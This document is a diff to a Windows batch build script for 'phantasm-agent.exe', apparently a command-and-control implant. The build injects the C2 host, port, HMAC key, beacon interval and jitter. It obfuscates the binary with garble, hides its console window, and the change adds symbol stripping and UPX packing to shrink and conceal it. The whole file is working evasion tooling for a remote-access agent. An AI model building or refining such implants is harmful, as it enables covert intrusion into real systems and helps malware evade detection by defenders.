@@ -53,17 +53,38 @@ if %ERRORLEVEL% NEQ 0 (
 
 echo [*] Building with garble obfuscation...
 
-REM Build with garble
-garble -literals -tiny build -ldflags "-H windowsgui -X main.listenerHost=%C2_HOST% -X main.listenerPort=%C2_PORT% -X main.listenerEndpoint=%C2_ENDPOINT% -X main.hmacKeyHex=%HMAC_KEY% -X main.reconnectIntervalStr=%BEACON_INTERVAL% -X main.jitterSecondsStr=%JITTER%" -o phantasm-agent.exe main.go
+REM Build with garble - add -s -w to strip symbols
+garble -literals -tiny build -ldflags "-s -w -H windowsgui -X main.listenerHost=%C2_HOST% -X main.listenerPort=%C2_PORT% -X main.listenerEndpoint=%C2_ENDPOINT% -X main.hmacKeyHex=%HMAC_KEY% -X main.reconnectIntervalStr=%BEACON_INTERVAL% -X main.jitterSecondsStr=%JITTER%" -o phantasm-agent.exe main.go
 
-if %ERRORLEVEL% EQU 0 (
-    echo.
-    echo [SUCCESS] Build complete: phantasm-agent.exe
-    echo.
-    dir /b phantasm-agent.exe
-) else (
+if %ERRORLEVEL% NEQ 0 (
     echo.
     echo [ERROR] Build failed!
     exit /b 1
 )
+
+echo [+] Build successful
+
+REM Get file size before compression
+for %%A in (phantasm-agent.exe) do set SIZE_BEFORE=%%~zA
+
+REM Check if UPX is available
+where upx >nul 2>&1
+if %ERRORLEVEL% EQU 0 (
+    echo [*] Compressing with UPX...
+    upx --best --lzma phantasm-agent.exe 2>nul
+    if %ERRORLEVEL% EQU 0 (
+        for %%A in (phantasm-agent.exe) do set SIZE_AFTER=%%~zA
+        echo [+] UPX compression successful
+        echo [*] Before: %SIZE_BEFORE% bytes, After: !SIZE_AFTER! bytes
+    ) else (
+        echo [!] UPX compression failed (garble-obfuscated binaries often can't be compressed)
+    )
+) else (
+    echo [!] UPX not found - skipping compression
+)
+
+echo.
+echo [SUCCESS] Build complete: phantasm-agent.exe
+echo.
+dir phantasm-agent.exe
 
